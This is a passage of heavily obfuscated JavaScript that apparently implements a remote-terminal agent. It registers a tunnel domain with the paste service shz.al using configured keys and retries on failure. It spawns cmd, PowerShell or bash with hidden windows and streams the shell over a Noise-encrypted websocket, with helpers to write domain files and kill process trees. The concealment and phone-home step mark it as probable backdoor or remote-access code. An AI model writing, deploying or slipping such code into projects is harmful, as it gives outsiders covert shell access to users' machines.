                    return g || h;
                },
                'IskKt': fo(0x645)
            }, b = a0P[fo(0x44c)] || '', c = a0P[fo(0x917)] || a0P['KNAME'] || '', d = [];
        if (a[fo(0x126)](b[fo(0x8fc)], 0x3))
            d[fo(0x1f0)](fo(0x745) + b[fo(0x8fc)] + fo(0x71f));
        if (!this[fo(0x84e)][fo(0x292)](b))
            d[fo(0x1f0)](a['wRqZv']);
        if (a[fo(0x12c)](c[fo(0x8fc)], 0x8))
            d[fo(0x1f0)](fo(0x3c6) + c[fo(0x8fc)] + fo(0x410) + (a0P[fo(0x917)] ? a[fo(0x8c2)] : a[fo(0x158)]) + ')');
        const f = d[fo(0x8fc)] === 0x0;
        return !f && !this[fo(0x763)] && (this[fo(0x763)] = !![], a0D[fo(0x5ac)](fo(0x2c3) + d[fo(0x2e0)](';\x20') + '\x20' + (fo(0x4d7) + a[fo(0x7ba)](b, '(未设置)') + fo(0x1cb) + (a0P[fo(0x917)] ? '已设置(len=' + a0P[fo(0x917)][fo(0x8fc)] + ')' : a[fo(0x8e0)]) + ')')), a0D[fo(0x5ac)](fo(0x8b4))), f;
    }
    static [a0aY(0x7a0)]() {
        const fp = a0aY, a = {
                'gcfdl': function (b, c) {
                    return b(c);
                }
            };
        return a0P[fp(0x628)] || a['gcfdl'](String, process.env.SHZAL_DEBUG || '')[fp(0x52c)]() === 'true';
    }
    static [a0aY(0x662)](a) {
        const fq = a0aY, b = {
                'qzQht': function (f, g) {
                    return f + g;
                },
                'RlgyK': '[KMODE:shz.al]\x20',
                'fwjNl': function (f, g) {
                    return f + g;
                },
                'ZxZWN': function (f, g) {
                    return f + g;
                },
                'drSIr': function (f, g) {
                    return f === g;
                },
                'cAkEq': function (f, g) {
                    return f(g);
                },
                'VFuNp': fq(0x850),
                'VQaqw': function (f, g, h, i, j) {
                    return f(g, h, i, j);
                },
                'iqBzx': function (f, g) {
                    return f(g);
                },
                'wsCMe': fq(0x136),
                'EQuaI': function (f, g) {
                    return f === g;
                },
                'DtZqu': fq(0x67a),
                'HeIaQ': function (f, g) {
                    return f(g);
                },
                'lDYnJ': function (f, g) {
                    return f + g;
                },
                'akBSw': function (f, g) {
                    return f + g;
                },
                'rQyXC': fq(0x233),
                'bUHux': function (f, g) {
                    return f + g;
                },
                'nkACj': fq(0x858),
                'FxuIb': fq(0x1e9),
                'WWtJl': function (f, g) {
                    return f + g;
                },
                'BCzMB': '----kisama',
                'fhinx': function (f, g) {
                    return f(g);
                },
                'pZJFj': function (f, g) {
                    return f + g;
                },
                'LmUQG': fq(0x340),
                'FWwCg': fq(0x797),
                'pVpDu': function (f, g) {
                    return f(g);
                },
                'rYKVA': function (f, g) {
                    return f + g;
                },
                'EIvgB': fq(0x66d)
            }, c = this[fq(0x7a0)](), d = f => {
                const fr = fq;
                if (c)
                    a0D[fr(0x52b)](b[fr(0x615)](b[fr(0x406)], f));
            };
        return new Promise(f => {
            const ft = fq, g = {
                    'KMqOA': b[ft(0x13f)],
                    'WLHko': function (n, o) {
                        const fu = ft;
                        return b[fu(0x32f)](n, o);
                    },
                    'aIsGK': b['nkACj'],
                    'ifkuU': function (n, o) {
                        return b['cAkEq'](n, o);
                    },
                    'JZMbw': b[ft(0x4d9)]
                }, h = a0P['KNAME'], i = a0P[ft(0x917)] || a0P['KNAME'], j = b[ft(0x1f1)](b[ft(0x563)], a0k[ft(0x6de)](0xc)['toString']('hex')), k = [
                    [
                        'c',
                        a
                    ],
                    [
                        'n',
                        h
                    ],
                    [
                        's',
                        i
                    ],
                    [
                        'e',
                        '7d'
                    ]
                ], l = n => {
                    const fv = ft, o = n[fv(0x162)](([p, q]) => Buffer[fv(0x317)]('--' + j + fv(0x5c9) + p + fv(0x102) + q + '\x0d\x0a'));
                    return o[fv(0x1f0)](Buffer[fv(0x317)]('--' + j + fv(0x403))), Buffer[fv(0x65f)](o);
                }, m = (n, o, p, q) => {
                    const fw = ft, r = {
                            'yWNcA': g[fw(0xf5)],
                            'eVaqK': function (v, w) {
                                return v(w);
                            },
                            'oqEBM': function (v, w) {
                                const fx = fw;
                                return g[fx(0x72c)](v, w);
                            },
                            'UBjJk': function (v, w) {
                                return v + w;
                            },
                            'bGGqU': g[fw(0x496)],
                            'alQJU': function (v, w) {
                                const fy = fw;
                                return g[fy(0x88c)](v, w);
                            }
                        }, s = new URL(n), t = a0h['request']({
                            'hostname': s[fw(0x65c)],
                            'port': s[fw(0x4c8)] || 0x1bb,
                            'path': g['WLHko'](s[fw(0x81e)], s[fw(0x202)]),
                            'method': p,
                            'headers': {
                                'Content-Type': fw(0x57a) + j,
                                'Content-Length': o ? o['length'] : 0x0,
                                'User-Agent': fw(0x6dc)
                            }
                        }, v => {
                            const fz = fw;
                            v[fz(0x311)](), v['on'](r[fz(0x3d2)], () => q(v[fz(0x14e)]));
                        });
                    t['on'](g[fw(0x65a)], v => {
                        const fA = fw;
                        r[fA(0x82f)](d, r['oqEBM'](r[fA(0x555)](p + '\x20', n), r[fA(0x449)]) + v[fA(0x113)]), r[fA(0x3c7)](q, 0x0);
                    }), t[fw(0x7e0)](0x7530, () => t[fw(0x6cf)](new Error(fw(0x2d2))));
                    if (o)
                        t[fw(0x624)](o);
                    t[fw(0x233)]();
                };
            b['fhinx'](d, b['pZJFj'](b['fwjNl'](b[ft(0x4f7)], h) + '\x20(key\x20已设置:\x20', i[ft(0x8fc)] > 0x0) + ')');
            try {
                m(b['FWwCg'], b[ft(0x3e0)](l, k), ft(0x3d4), n => {
                    const fC = ft, o = {
                            'iBLMp': function (p, q) {
                                return p(q);
                            },
                            'vTNaj': function (p, q) {
                                return b['fwjNl'](p, q);
                            },
                            'LulKG': function (p, q) {
                                return b['ZxZWN'](p, q);
                            },
                            'FGUlQ': function (p, q) {
                                const fB = a0b;
                                return b[fB(0x469)](p, q);
                            },
                            'dsOED': fC(0x83f),
                            'ctoqd': function (p, q) {
                                return p === q;
                            }
                        };
                    b['cAkEq'](d, b[fC(0x409)](fC(0x824), n));
                    if (n === 0x199) {
                        b[fC(0x2ab)](d, b[fC(0x409)](b[fC(0x409)](b[fC(0x42f)], h), ':*'));
                        const p = k[fC(0x3fe)](([q]) => q !== 'n');
                        b[fC(0x8a9)](m, fC(0x60e) + h + ':' + i, b['iqBzx'](l, p), b['wsCMe'], q => {
                            const fD = fC;
                            o['iBLMp'](d, o['vTNaj'](o[fD(0x3f6)]('PUT\x20覆盖状态:\x20', q), o[fD(0x2b0)](q, 0xc8) ? o[fD(0x833)] : '\x20(失败)')), o[fD(0x57e)](f, o[fD(0x46c)](q, 0xc8));
                        });
                    } else
                        b[fC(0x399)](n, 0xc8) ? (b[fC(0x2ab)](d, b[fC(0x16d)]), b[fC(0x2fe)](f, !![])) : (b[fC(0x2fe)](d, b[fC(0x333)](b[fC(0x8b3)](fC(0x85b), n), ')')), b[fC(0x2ab)](f, ![]));
                });
            } catch (n) {
                d(b[ft(0x5ef)](b['EIvgB'], n[ft(0x113)])), f(![]);
            }
        })[fq(0x3f7)](f => {
            const fE = fq;
            if (f)
                this[fE(0x3e3)] = a;
            return f;
        })[fq(0x843)](() => ![]);
    }
    static async [a0aY(0x631)](a) {
        const fF = a0aY, b = {
                'EwWrT': function (c, d) {
                    return c < d;
                }
            };
        for (let c = 0x1; c <= 0x3; c++) {
            if (await this[fF(0x662)](a))
                return;
            b[fF(0x159)](c, 0x3) && await new Promise(d => setTimeout(d, 0x3e8 * 0x2 ** c));
        }
    }
    static [a0aY(0x1c9)]() {
        const fG = a0aY, a = [
                process.env.USERPROFILE,
                process.env.HOME
            ];
        for (const b of a) {
            if (b && a0l[fG(0xfe)](b) && a0l[fG(0xca)](b)[fG(0x8e1)]())
                return b;
        }
        try {
            return a0p['homedir']();
        } catch (c) {
            return process['cwd']();
        }
    }
    static [a0aY(0x3a6)]() {
        const fH = a0aY, a = {
                'yquvr': fH(0x885),
                'WkliQ': fH(0x880)
            };
        let b = (a0P[fH(0x204)] || '')['trim']();
        if (!b)
            return a0o[fH(0x2e0)](this[fH(0x1c9)](), a[fH(0x4bc)]);
        if (b[fH(0x49a)](a['WkliQ']))
            b = b['length'] > 0x5 ? a0o['join'](this[fH(0x1c9)](), b['slice'](0x5)[fH(0x7ee)](/^[/\\]+/, '')) : this['homeDir']();
        else
            b[fH(0x49a)]('~') && (b = a0o[fH(0x791)](b[fH(0x7ee)](/^~(?=[/\\]|$)/, this[fH(0x1c9)]())));
        return b;
    }
    static [a0aY(0x19a)](a) {
        const fI = a0aY;
        this[fI(0x3e3)] = a;
        const b = this['resolveDomainFilePath']();
        try {
            a0l[fI(0x45e)](a0o[fI(0x2fc)](a0o[fI(0x791)](b)), { 'recursive': !![] }), a0l['writeFileSync'](b, a), a0D[fI(0x5ac)]('[KMODE]\x20📄\x20隧道域名已写入:\x20' + b);
        } catch (c) {
            a0D[fI(0x6e1)](fI(0x78b) + b + fI(0x67d) + c[fI(0x113)]);
        }
    }
    static ['deleteDomainFile']() {
        const fJ = a0aY, a = this['resolveDomainFilePath']();
        try {
            a0l[fJ(0xfe)](a) && a0l[fJ(0xca)](a)[fJ(0x10b)]() && (a0l[fJ(0x523)](a), a0D[fJ(0x5ac)](fJ(0x626) + a));
        } catch (b) {
            a0D[fJ(0x6e1)](fJ(0x446) + a + fJ(0x67d) + b['message']);
        }
    }
    static [a0aY(0x355)]() {
        const fK = a0aY;
        !this[fK(0x534)] && (this['_baseinfoHooked'] = !![], this['deleteDomainFile']());
    }
    static [a0aY(0x1dc)]() {
        const fL = a0aY, a = {
                'XOikE': fL(0x435),
                'hlUSR': fL(0x63c),
                'cePUl': fL(0x579),
                'gqCtA': fL(0x4a5)
            };
        try {
            const b = a0q[fL(0x265)]({
                'input': process[fL(0x17f)],
                'terminal': ![]
            });
            b['on'](a[fL(0x583)], c => {
                const fM = fL;
                c[fM(0x2eb)]() === a['XOikE'] && console[fM(0x60c)](this[fM(0x3e3)] || a['hlUSR']);
            }), b['on'](a[fL(0x2d0)], () => {
            }), b['on'](fL(0x1e9), () => {
            });
        } catch (c) {
        }
    }
    static [a0aY(0x123)](a) {
        const fN = a0aY, b = {
                'vPuwW': fN(0x3d0),
                'xTiNV': function (f, g) {
                    return f === g;
                }
            }, c = b['vPuwW']['split']('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                a0D[fN(0x5ac)](fN(0x650));
                continue;
            case '1':
                a[fN(0x774)] = (f, g) => {
                    this['writeDomainFile'](g);
                };
                continue;
            case '2':
                this[fN(0x1dc)]();
                continue;
            case '3':
                a[fN(0x278)](a0P['PORT'])[fN(0x3f7)](f => {
                    const fO = fN;
                    this[fO(0x19a)](f[fO(0x764)]);
                })['catch'](f => {
                    const fP = fN;
                    a0D['warn'](fP(0x69b) + f[fP(0x113)]);
                });
                continue;
            case '4':
                if (b['xTiNV'](a0P[fN(0x26a)], '2') && this[fN(0x3d1)]()) {
                    a0D[fN(0x5ac)](fN(0x815)), a[fN(0x774)] = (f, g) => {
                        const fQ = fN;
                        this[fQ(0x631)](g);
                    }, a['create'](a0P[fN(0x81b)])[fN(0x3f7)](f => this[fN(0x662)](f[fN(0x764)]))[fN(0x843)](() => {
                    });
                    return;
                }
                continue;
            }
            break;
        }
    }
}
let a0aO = null, a0aP = null;
const a0aQ = new Promise((a, b) => {
    const fR = a0aY, c = {
            'vEeNJ': fR(0x375),
            'Yzgum': function (d) {
                return d();
            },
            'cJSMZ': fR(0x2ff),
            'GZBVY': function (d, f) {
                return d(f);
            }
        };
    try {
        c[fR(0x5a9)](a0y, function (d) {
            const fS = fR;
            if (!d) {
                a0aP = new Error(c[fS(0x405)]), a0D[fS(0x6e1)](fS(0x537), a0aP[fS(0x113)]), c[fS(0x41e)](a);
                return;
            }
            a0aO = d, a0D['debug'](c[fS(0x320)]), a();
        });
    } catch (d) {
        a0aP = d, a0D[fR(0x6e1)](fR(0x5ad), d[fR(0x113)]), c['Yzgum'](a);
    }
});
process['on'](a0aY(0xd0), (a, b) => {
    const fT = a0aY;
    a0D[fT(0x1e9)](fT(0x6bc), a);
}), process['on'](a0aY(0x46f), a => {
    const fU = a0aY;
    a0D[fU(0x1e9)](fU(0x497), a), process[fU(0x56d)](0x1);
});
class a0aR {
    constructor(a, b, c) {
        const fV = a0aY, d = { 'JOgfx': fV(0x582) }, f = d[fV(0x72d)][fV(0x3ab)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this[fV(0x86d)] = ![];
                continue;
            case '1':
                this[fV(0x62e)] = a;
                continue;
            case '2':
                this[fV(0x1f5)] = null;
                continue;
            case '3':
                this[fV(0x24c)] = b;
                continue;
            case '4':
                this[fV(0x443)] = null;
                continue;
            case '5':
                this['hs'] = null;
                continue;
            case '6':
                this[fV(0x5f6)] = c;
                continue;
            }
            break;
        }
    }
    async [a0aY(0x5bd)]() {
        const fW = a0aY, a = {
                'OOSpd': 'Noise\x20WASM\x20module\x20not\x20available',
                'VgQnw': fW(0x6f9),
                'rTeHS': fW(0x596),
                'zoOqt': fW(0x262)
            };
        await a0aQ;
        if (!a0aO)
            throw a0aP || new Error(a[fW(0x62d)]);
        const b = a0aO, c = this[fW(0x62e)] ? b[fW(0x392)]['NOISE_ROLE_INITIATOR'] : b[fW(0x392)][fW(0x7e4)];
        this['hs'] = b[fW(0x668)](a[fW(0x1a2)], c);
        const d = Buffer[fW(0x317)](a['rTeHS']), f = this['localPrivB64'] ? Buffer[fW(0x317)](this[fW(0x24c)], a['zoOqt']) : null, g = this[fW(0x5f6)] ? Buffer[fW(0x317)](this[fW(0x5f6)], a[fW(0x21d)]) : null;
        this['hs'][fW(0x2a4)](d, f, g, null);
    }
    [a0aY(0x7bb)](a) {
        const fX = a0aY, b = {
                'ECFlJ': function (d, f) {
                    return d > f;
                },
                'YwUaM': function (d, f) {
                    return d === f;
                },
                'hfmze': function (d, f) {
                    return d === f;
                }
            };
        if (this['handshakeFinished'])
            return Buffer[fX(0x5fd)](0x0);
        const c = a0aO;
        a && b['ECFlJ'](a[fX(0x8fc)], 0x0) && b[fX(0x393)](this['hs'][fX(0x467)](), c['constants'][fX(0x570)]) && this['hs'][fX(0x457)](a);
        if (this['hs'][fX(0x467)]() === c[fX(0x392)][fX(0x379)])
            return this[fX(0x731)](), Buffer[fX(0x5fd)](0x0);
        if (b['hfmze'](this['hs']['GetAction'](), c[fX(0x392)]['NOISE_ACTION_WRITE_MESSAGE'])) {
            const d = this['hs']['WriteMessage'](new Uint8Array(0x0));
            return b['YwUaM'](this['hs']['GetAction'](), c['constants'][fX(0x379)]) && this[fX(0x731)](), Buffer['from'](d);
        }
        return Buffer['alloc'](0x0);
    }
    [a0aY(0x731)]() {
        const fY = a0aY, a = {
                'SVbla': fY(0x262),
                'BXZFT': function (g, h) {
                    return g === h;
                },
                'YCPwh': fY(0x522)
            };
        let b = null;
        try {
            b = this['hs'][fY(0x17e)]();
        } catch (g) {
            b = null;
        }
        const c = this[fY(0x5f6)] ? Buffer[fY(0x317)](this[fY(0x5f6)], a[fY(0x622)]) : null, d = b && c && a[fY(0x8f1)](b[fY(0x8fc)], c[fY(0x8fc)]) && a0k[fY(0x85a)](Buffer[fY(0x317)](b), c);
        if (!d)
            throw new Error(a[fY(0x89c)]);
        const f = this['hs'][fY(0x684)]();
        this[fY(0x443)] = f[0x0], this[fY(0x1f5)] = f[0x1], this[fY(0x86d)] = !![];
        try {
            if (this['hs'])
                this['hs'][fY(0x7bd)]();
        } catch (h) {
        }
        this['hs'] = null;
    }
    [a0aY(0x776)](a) {
        const fZ = a0aY, b = { 'xyNUV': '握手未完成，无法加密数据' };
        if (!this['handshakeFinished'])
            throw new Error(b['xyNUV']);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[fZ(0x317)](this[fZ(0x443)][fZ(0x275)](c, d));
    }
    ['decrypt'](a) {
        const g0 = a0aY, b = { 'DzZby': g0(0x2d9) };
        if (!this[g0(0x86d)])
            throw new Error(b[g0(0x2c6)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[g0(0x317)](this[g0(0x1f5)]['DecryptWithAd'](c, d));
    }
    ['free']() {
        const g1 = a0aY, a = { 'teJAu': g1(0x79f) }, b = a['teJAu'][g1(0x3ab)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                try {
                    if (this[g1(0x443)])
                        this[g1(0x443)]['free']();
                } catch (d) {
                }
                continue;
            case '1':
                this['hs'] = null;
                continue;
            case '2':
                this[g1(0x1f5)] = null;
                continue;
            case '3':
                try {
                    if (this['hs'])
                        this['hs'][g1(0x7bd)]();
                } catch (f) {
                }
                continue;
            case '4':
                try {
                    if (this[g1(0x1f5)])
                        this[g1(0x1f5)][g1(0x7bd)]();
                } catch (g) {
                }
                continue;
            case '5':
                this['sendCipher'] = null;
                continue;
            }
            break;
        }
    }
}
class a0aS {
    constructor(a, b, c, d) {
        const g2 = a0aY, f = { 'ENZjP': g2(0x6b3) }, g = f['ENZjP'][g2(0x3ab)]('|');
        let h = 0x0;
        while (!![]) {
            switch (g[h++]) {
            case '0':
                this[g2(0x2e8)] = null;
                continue;
            case '1':
                this[g2(0x49e)] = d || [];
                continue;
            case '2':
                this[g2(0x247)] = b;
                continue;
            case '3':
                this['pid'] = 0x0;
                continue;
            case '4':
                this['proc'] = null;
                continue;
            case '5':
                this['cwd'] = c;
                continue;
            case '6':
                this['shell'] = a;
                continue;
            case '7':
                this[g2(0x894)] = null;
                continue;
            }
            break;
        }
    }
    [a0aY(0x727)]() {
        const g3 = a0aY, a = {
                'QditS': function (c, d) {
                    return c || d;
                },
                'HKYuQ': 'pipe',
                'kxupv': g3(0x7a4),
                'InKeH': 'exit'
            };
        this['proc'] = a0s(this[g3(0x349)], this[g3(0x49e)], {
            'env': this[g3(0x247)],
            'cwd': this[g3(0x2c4)],
            'windowsHide': !![],
            'stdio': [
                a['HKYuQ'],
                g3(0x8a2),
                a[g3(0x900)]
            ]
        }), this[g3(0x24b)] = this[g3(0x798)][g3(0x24b)] || 0x0;
        const b = this;
        this[g3(0x798)][g3(0x2db)]['on'](a[g3(0x2df)], c => b[g3(0x3af)](c)), this['proc'][g3(0x471)]['on'](a['kxupv'], c => b[g3(0x3af)](c)), this['proc']['on'](a[g3(0x565)], (c, d) => {
            const g4 = g3;
            if (b[g4(0x2e8)])
                b[g4(0x2e8)]({
                    'exitCode': c,
                    'signal': a[g4(0x3a2)](d, null)
                });
        });
    }
    [a0aY(0x3af)](a) {
        const g5 = a0aY, b = { 'ivSar': g5(0x1af) };
        if (this['_onDataCb'])
            this[g5(0x894)](a[g5(0x62f)](b[g5(0x8d8)]));
    }
    [a0aY(0x42e)](a) {
        return this['_onDataCb'] = a, {
            'dispose': () => {
                this['_onDataCb'] = null;
            }
        };
    }
    [a0aY(0x7c8)](a) {
        const g6 = a0aY;
        return this[g6(0x2e8)] = a, {
            'dispose': () => {
                const g7 = g6;
                this[g7(0x2e8)] = null;
            }
        };
    }
    [a0aY(0x624)](a) {
        const g8 = a0aY;
        if (!this[g8(0x798)] || !this[g8(0x798)]['stdin'])
            return;
        try {
            this[g8(0x798)][g8(0x17f)][g8(0x624)](a);
        } catch (b) {
        }
    }
    [a0aY(0x480)]() {
    }
    [a0aY(0x30e)]() {
        const g9 = a0aY;
        try {
            if (this[g9(0x798)])
                this[g9(0x798)][g9(0x30e)]();
        } catch (a) {
        }
    }
}
class a0aT {
    constructor() {
        const ga = a0aY, a = {
                'Xrcsq': '9|5|7|11|0|4|10|1|3|6|2|8',
                'tuAsd': ga(0x7dc)
            }, b = a[ga(0x211)][ga(0x3ab)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[ga(0x4b4)] = ![];
                continue;
            case '1':
                this['msgQueue'] = [];
                continue;
            case '2':
                this[ga(0x72f)] = a0P['NOISE_KEYS_INTERNAL'][ga(0x1a9)][ga(0x4cb)];
                continue;
            case '3':
                this[ga(0x1f4)] = [];
                continue;
            case '4':
                this[ga(0x7d2)] = ![];
                continue;
            case '5':
                this[ga(0x6a3)] = null;
                continue;
            case '6':
                this['AGENT_PRIVATE_KEY'] = a0P[ga(0x67b)]['agent'][ga(0x8bf)];
                continue;
            case '7':
                this['requestId'] = null;
                continue;
            case '8':
                this[ga(0x2f7)] = new a0aR(![], this['AGENT_PRIVATE_KEY'], this[ga(0x72f)]);
                continue;
            case '9':
                this[ga(0x802)] = null;
                continue;
            case '10':
                this['phase'] = a[ga(0xe8)];
                continue;
            case '11':
                this[ga(0x8da)] = !![];
                continue;
            }
            break;
        }
    }
    async [a0aY(0x3c9)]() {
        const gb = a0aY, a = {
                'YyGeP': function (b, c) {
                    return b === c;
                },
                'pcsZS': 'win32',
                'fcyhC': function (b, c) {
                    return b === c;
                },
                'zaqPn': gb(0x428)
            };
        this[gb(0x327)] && a0D[gb(0x5ac)]('[' + this[gb(0x327)] + gb(0x525));
        if (this['ptyProcess']) {
            a[gb(0x205)](process[gb(0x473)], a[gb(0x50a)]) && this['ptyProcess'][gb(0x24b)] && this['_taskkillTree'](this[gb(0x802)][gb(0x24b)]);
            try {
                this[gb(0x802)][gb(0x30e)]();
            } catch (b) {
            }
            this[gb(0x802)] = null;
        }
        if (this[gb(0x2f7)])
            this[gb(0x2f7)][gb(0x7bd)]();
        if (this['websocket'])
            try {
                a[gb(0x2cf)](this['websocket'][gb(0x82c)], this[gb(0x6a3)][gb(0x209)]) && this[gb(0x6a3)][gb(0x4a5)](0x3e8, a[gb(0x44e)]);
            } catch (c) {
            } finally {
                this['websocket'] = null;
            }
    }
    [a0aY(0x8e4)](a) {
        const gc = a0aY, b = {
                'xHcnz': function (c, d, f, g) {
                    return c(d, f, g);
                }
            };
        try {
            b[gc(0xd9)](a0r, 'taskkill\x20/F\x20/T\x20/PID\x20' + a, { 'windowsHide': !![] }, () => {
            });
        } catch (c) {
        }
    }
    ['_handleRawMessage'](a) {
        const gd = a0aY, b = {
                'jxVVP': function (c, d) {
                    return c === d;
                },
                'aOJgk': 'handshake',
                'eCDYv': function (c, d) {
                    return c > d;
                },
                'muZiJ': function (c, d) {
                    return c(d);
                }
            };
        if (b[gd(0x6b2)](this['phase'], b[gd(0x81d)])) {
            if (b[gd(0x5c1)](this[gd(0x1f4)][gd(0x8fc)], 0x0)) {
                const c = this['msgResolvers']['shift']();
                b['muZiJ'](c, a);
            } else
                this[gd(0x8d0)][gd(0x1f0)](a);
        } else
            b[gd(0x6b2)](this[gd(0x695)], gd(0x715)) && this[gd(0x397)](a);
    }
    async [a0aY(0x827)]() {
        const ge = a0aY, a = {
                'LrLCT': function (b, c) {
                    return b > c;
                }
            };
        if (a[ge(0x91d)](this[ge(0x8d0)][ge(0x8fc)], 0x0))
            return this[ge(0x8d0)][ge(0x773)]();
        return new Promise(b => {
            const gf = ge;
            this[gf(0x1f4)][gf(0x1f0)](b);
        });
    }
    async [a0aY(0x61c)](a) {
        const gg = a0aY, b = {
                'tHWSr': function (c, d) {
                    return c(d);
                },
                'uRbRe': gg(0x8e8),
                'UyBdJ': '三次握手交互后仍未进入\x20Established\x20状态',
                'gZXYo': '加密握手失败'
            };
        b[gg(0x5f3)](a, b[gg(0x540)]);
        try {
            await this['cipher']['init']();
            const c = await this[gg(0x827)](), d = this[gg(0x2f7)][gg(0x7bb)](c);
            d && d[gg(0x8fc)] > 0x0 && this[gg(0x6a3)][gg(0x272)](d);
            const f = await this[gg(0x827)]();
            this[gg(0x2f7)][gg(0x7bb)](f);
            if (!this[gg(0x2f7)]['handshakeFinished'])
                throw new Error(b[gg(0x532)]);
            a('✅\x20Noise\x20握手完成，端到端加密通道已建立！');
        } catch (g) {
            a(gg(0x439) + g[gg(0x113)]);
            throw new Error(b['gZXYo']);
        }
    }
    [a0aY(0x3f0)]() {
        const gh = a0aY, a = {
                'xfYJl': function (d, f) {
                    return d === f;
                },
                'qKQke': gh(0x737),
                'IgDDV': gh(0x3fc),
                'gXmOo': gh(0x8b0),
                'TdlfY': gh(0x7a9),
                'KNUWT': 'powershell.exe',
                'YTwAh': gh(0x86e),
                'tGdXz': gh(0x1d1),
                'ZflIA': gh(0x5ca)
            };
        if (a[gh(0x7ea)](process[gh(0x473)], a[gh(0x271)])) {
            const d = process.env.SystemRoot || a[gh(0x176)], f = [
                    a0o[gh(0x2e0)](d, a['gXmOo'], gh(0x1ba), a[gh(0x796)], a[gh(0x671)]),
                    process.env.COMSPEC,
                    a0o[gh(0x2e0)](d, a[gh(0x358)], gh(0x41f))
                ];
            for (const g of f) {
                if (g && a0l['existsSync'](g))
                    return g;
            }
            return 'cmd.exe';
        }
        const b = [
            '/bin/bash',
            a[gh(0x3df)],
            a[gh(0x71b)]
        ];
        for (const h of b) {
            if (a0l['existsSync'](h))
                return h;
        }
        const c = process.env.SHELL;
        if (c && a0l[gh(0xfe)](c))
            return c;
        return a[gh(0x1f2)];
    }
    async [a0aY(0x6b0)](a, b, c, d = ![], f = ![]) {
        const gi = a0aY, g = {
                'dzeUT': function (i, j) {
                    return i(j);
                },
                'SFKGK': '🔗\x20检测到\x20WS\x20连接，启用\x20Noise\x20加密',
                'eLnbE': gi(0x113)
            };
        this['websocket'] = a, this['requestId'] = b, this[gi(0x4b4)] = d, this[gi(0x7d2)] = f;
        const h = i => a0D[gi(0x5ac)](gi(0x8e5) + b + ']\x20' + i);
        this[gi(0x8da)] = !c, g[gi(0x61e)](h, this[gi(0x8da)] ? g['SFKGK'] : gi(0xce)), a['on'](g[gi(0x512)], i => this[gi(0x16f)](i));
        try {
            this[gi(0x8da)] && await this['_doNoiseHandshake'](h), await this['_runTerminal'](h);
        } catch (i) {
            g[gi(0x61e)](h, gi(0x48f) + i[gi(0x113)]), await this[gi(0x3c9)]();
        }
    }
    async ['_runTerminal'](a) {
        const gj = a0aY, b = {
                'vgXej': 'utf-8',
                'MESEj': function (h, i) {
                    return h === i;
                },
                'LgiOG': function (h, i) {
                    return h(i);
                },
                'RKSBi': gj(0x913),
                'jmDhA': function (h, i) {
                    return h !== i;
                },
                'CIxBm': gj(0x1bc),
                'vltEB': function (h, i) {
                    return h === i;
                },
                'tTsHr': gj(0x465),
                'CTgPd': function (h) {
                    return h();
                },
                'HpVGl': gj(0x1e3),
                'Wiiss': function (h, i) {
                    return h === i;
                },
                'pBieW': gj(0x737),
                'JfqOM': 'terminal',
                'xpGzC': function (h, i) {
                    return h > i;
                },
                'GIINP': function (h, i) {
                    return h(i);
                }
            }, c = this[gj(0x3f0)]();
        b[gj(0x2b7)](a, gj(0x45b) + c);
        const d = Object[gj(0x60a)]({}, process.env);
        delete d['PROMPT_COMMAND'], d[gj(0x41c)] = 'xterm-256color';
        if (!d[gj(0x38a)])
            d[gj(0x38a)] = b[gj(0x51d)];
        this[gj(0x7d2)] && b[gj(0x322)](process['platform'], gj(0x737)) && (d[gj(0x331)] = b[gj(0x7c3)]);
        const f = this[gj(0x7d2)] && b['vltEB'](process['platform'], 'win32') && b['vltEB'](a0o[gj(0x884)](c)[gj(0x52c)](), gj(0x558)) ? [
                gj(0x1d0),
                b[gj(0x4bb)],
                gj(0x746)
            ] : [], g = b[gj(0x4a0)](a0E);
        try {
            const h = {
                'name': b['HpVGl'],
                'cols': 0x50,
                'rows': 0x18,
                'cwd': g,
                'env': d
            };
            if (b[gj(0x46e)](process[gj(0x473)], b['pBieW']))
                try {
                    this[gj(0x802)] = a0C[gj(0x727)](c, f, h);
                } catch (i) {
                    a(gj(0x5f8) + i[gj(0x113)]), this[gj(0x802)] = new a0aS(c, d, g, f), this[gj(0x802)][gj(0x727)]();
                }
            else
                this[gj(0x802)] = a0C[gj(0x727)](c, f, h);
            b['LgiOG'](a, gj(0x892) + (this['ptyProcess'][gj(0x24b)] || 'unknown') + ')');
            this[gj(0x4b4)] && this['_sendWelcome'](c);
            this[gj(0x695)] = b[gj(0x279)];
            while (b['xpGzC'](this[gj(0x8d0)][gj(0x8fc)], 0x0)) {
                const j = this[gj(0x8d0)][gj(0x773)]();
                this[gj(0x397)](j);
            }
            this[gj(0x802)][gj(0x42e)](k => {
                const gk = gj;
                try {
                    let l = Buffer[gk(0x317)](k, b[gk(0x5a3)]);
                    this[gk(0x8da)] && this[gk(0x2f7)] && this[gk(0x2f7)]['handshakeFinished'] && (l = this[gk(0x2f7)]['encrypt'](l)), b[gk(0x140)](this[gk(0x6a3)][gk(0x82c)], 0x1) && this[gk(0x6a3)][gk(0x272)](l);
                } catch (m) {
                }
            }), this['ptyProcess'][gj(0x7c8)](({
                exitCode: k,
                signal: l
            }) => {
                const gl = gj;
                b[gl(0x2b7)](a, '🔌\x20终端进程退出\x20(Code:\x20' + k + gl(0x27b) + l + ')'), this[gl(0x3c9)]();
            }), this[gj(0x6a3)]['on'](gj(0x4a5), () => {
                const gm = gj;
                a(gm(0x232)), this[gm(0x3c9)]();
            });
        } catch (k) {
            b[gj(0x79c)](a, gj(0x129) + k[gj(0x113)]), await this['cleanup']();
            throw k;
        }
    }
    static [a0aY(0x227)](a) {
        const gn = a0aY, b = { 'RyGtp': '.exe' };
        let c = a0o[gn(0x884)](String(a || '')[gn(0x2eb)]())[gn(0x52c)]();
        if (c['endsWith'](b[gn(0x664)]))
            c = c[gn(0x806)](0x0, -0x4);
        return c || 'sh';
    }
    static [a0aY(0x4d2)](a) {
        const go = a0aY, b = {
                'jqABp': function (c, d) {
                    return c === d;
                },
                'lkXgd': go(0x737),
                'AfzSG': function (c, d) {
                    return c(d);
                },
                'hJqxn': function (c, d) {
                    return c || d;
                },
                'ssrup': 'powershell.exe',
                'ifDhQ': go(0x41f)
            };
        if (b[go(0x91f)](process['platform'], b[go(0x1bb)])) {
